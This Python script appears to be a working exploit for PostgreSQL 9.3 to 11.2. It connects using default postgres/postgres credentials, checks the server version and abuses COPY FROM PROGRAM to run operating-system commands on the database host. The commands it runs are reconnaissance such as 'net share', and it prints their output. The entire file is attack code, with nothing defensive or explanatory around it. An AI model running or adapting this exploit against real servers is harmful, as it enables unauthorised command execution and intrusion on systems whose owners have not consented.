import psycopg2
import argparse
import hashlib
import time

def main() -> object:
    try:
        hosts = '127.0.0.1'
        port = 5432
        db = 'test1'
        user = 'postgres'
        password = 'postgres'
        # command = 'chcp 65001>nul && ipconfig'
        command = r'chcp 65001>nul && net share'

        print("[+] Connecting to PostgreSQL Database on {0}:{1}".format(hosts, port))
        conn = psycopg2.connect(host=hosts, port=port, dbname=db, user=user, password=password)
        print("[+] Connected to PostgreSQL Database")

        print("[+] Checking PostgreSQL version")
        checkVersion(conn)

        exploit(conn, command)

    except psycopg2.OperationalError as e:
        print("\r\n[-] Connection to PostgreSQL Database failed: \r\n{0}".format(e))
        exit()
def checkVersion(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()
    result = deserialize(record)
    ver_start = result.find("PostgreSQL") ;
    if(ver_start != -1):
        ver_start += 11
        ver_str = result[ver_start:ver_start+3]
        version = float(ver_str)
    if (version >= 9.3 and version <= 11.2):
        print("[+] PostgreSQL {0} is likely vulnerable".format(version))
    else:
        print("[-] PostgreSQL {0} may not vulnerable".format(version))
        exit()


def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0] + "\r\n"
    return result

def exploit(connection, command):
    cursor = connection.cursor()
    # tableName = randomizeTableName()
    tableName = r'tb1'
    try:
        print("[+] Creating table {0}".format(tableName))
        cursor.execute(f"""DROP TABLE IF EXISTS {tableName};\
                        CREATE TABLE {tableName}(cmd_output text);\
                        COPY {tableName} FROM PROGRAM '{command}';\
                        SELECT * FROM {tableName};""")

        print("[+] Command executed\r\n")

        record = cursor.fetchall()
        result = deserialize(record)
        print(result)

        # print("[+] Deleting table {0}\r\n".format(tableName))
        # cursor.execute("DROP TABLE {0};".format(tableName))

        cursor.close()

    except psycopg2.errors.ExternalRoutineException as e:
        print("[-] Command failed : {0}".format(e.pgerror))
        print("[+] Deleting table {0}\r\n".format(tableName))
        cursor = connection.cursor()
        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    finally:
        exit()

if __name__ == "__main__":
    main()
